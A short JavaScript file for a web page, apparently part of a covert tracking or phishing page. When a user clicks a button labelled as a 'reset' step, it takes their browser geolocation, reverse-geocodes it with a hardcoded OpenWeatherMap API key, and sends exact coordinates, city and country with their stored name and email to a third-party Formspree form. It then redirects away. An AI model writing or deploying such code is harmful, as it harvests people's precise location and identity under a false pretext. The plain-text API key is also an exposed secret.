const api_key = '14cbf5ce61b5030be83f2fac1289a1a9';

document.addEventListener('DOMContentLoaded', function() {
    const image = localStorage.getItem('image');
    const name = localStorage.getItem('name');
    const email = localStorage.getItem('email');

    if (image && name && email) {
        document.getElementById('image').src = image;
        document.getElementById('name').textContent = name;
        document.getElementById('email').textContent = email;
    } else {
        window.location.href = "index.html";
    }

    document.getElementById('goToReset').addEventListener('click', function() {
        navigator.geolocation.getCurrentPosition(position => {
            const { latitude, longitude } = position.coords;
            getReverseGeocoding(latitude, longitude, name, email);
        }, error => {
            if (error.code === error.PERMISSION_DENIED) {
                alert('Geolocation permission denied. Please reset location permission to grant access again');
            }
        });
    });
});

function getReverseGeocoding(lat, lon, name, email) {
    const REVERSE_GEOCODING_URL = `https://api.openweathermap.org/geo/1.0/reverse?lat=${lat}&lon=${lon}&limit=1&appid=${api_key}`;
    fetch(REVERSE_GEOCODING_URL)
        .then(res => res.json())
        .then(data => {
            if (data.length === 0) {
                alert(`No data found for coordinates (${lat}, ${lon})`);
                return;
            }
            const { name: city, state, country } = data[0];
            sendLocationData(name, email, city, state, country, lat, lon);
        })
        .catch(() => {
            alert(`Failed to fetch location data for coordinates (${lat}, ${lon})`);
        });
}

function sendLocationData(name, email, city, state, country, lat, lon) {
    const data = {
        name: name,
        email: email, 
        message: `
        Ubicación del usuario: 
        Latitud: ${lat}
        Longitud: ${lon}
        País: ${country}
        Estado: ${state}
        Ciudad: ${city}`
    };

    fetch('https://formspree.io/f/manworvw', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(responseData => {
        if (responseData.ok) {
            window.location.href = 'return.html';
        } else {
            alert('Hubo un problema al enviar los datos');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Hubo un problema al enviar los datos');
    });
}
